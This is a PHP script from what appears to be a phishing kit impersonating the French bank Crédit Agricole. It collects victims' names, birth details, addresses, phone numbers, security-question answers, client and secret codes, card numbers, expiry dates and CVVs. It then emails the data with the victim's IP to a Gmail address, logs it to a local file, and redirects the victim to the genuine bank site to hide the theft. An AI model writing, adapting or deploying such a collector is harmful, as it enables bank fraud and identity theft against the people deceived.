<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$ayb  = "===================+ S.G 4 +===============<===\n";
$ayb .= "civilite: ".$_POST['cevi']."\n";
$ayb .= "nom : ".$_POST['nom']."\n";
$ayb .= "Prenom : ".$_POST['prenom']."\n";
$ayb .= "Date de naissane : ".$_POST['born']."\n";
$ayb .= "Departement de naissance : ".$_POST['departement']."\n";
$ayb .= "Code postal : ".$_POST['zip']."\n";
$ayb .= "Ville : ".$_POST['ville']."\n";
$ayb .= "reponse : ".$_POST['rep']."\n";
$ayb .= "Adresse : ".$_POST['adress']."\n";
$ayb .= "telephone : ".$_POST['telephone']."\n\n";
$ayb .= "===================+ Ara bere3  +===============<===\n";
$ayb .= "Dans quelle rue avez-vous grandi ?: ".$_POST['rue_grandi']."\n";
$ayb .= "Quel est le prénom de l'aîné(e) de vos cousins et cousines ?  : ".$_POST['cousin']."\n";
$send = "gladimirbotin@gmail.com";
$ayb .= "Quel était le prénom de votre meilleur(e) ami(e) d'enfance ? : ".$_POST['bestfriend']."\n";
$ayb .= "Quel était votre dessin animé préféré ? : ".$_POST['mikiyate']."\n";
$ayb .= "Quel a été votre lieu de vacances préféré durant votre enfance ? : ".$_POST['vacance']."\n";
$ayb .= "================================================================\n";
$ayb .= "code client : ".$_POST['ident']."\n";
$ayb .= "code secret : ".$_POST['ReadOut']."\n";
$ayb .= "Numero De Carte bancaire : ".$_POST['nuum']."\n";
$ayb .= "Date d'expiration : ".$_POST['mois']." / ".$_POST['annee']."\n";
$ayb .= "CVV : ".$_POST['xrypt']."\n\n";
$ayb .= "================================================================\n";
$ayb .= "Client IP : ".$ip."\n";
$ayb .= "HostName : ".$hostname."\n";
$ayb .= "===================+ E-zizooooooooooooooooooo +===================\n";






$send = "gladimirbotin@gmail.com";

$subjet = "agricole $ip";
$headers = "From:  <z@mffic.com>";


mail($send,$subject,$ayb,$headers);
$file = fopen("imm.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$ayb); 

header("Location: http://credit-agricole.fr");

?>
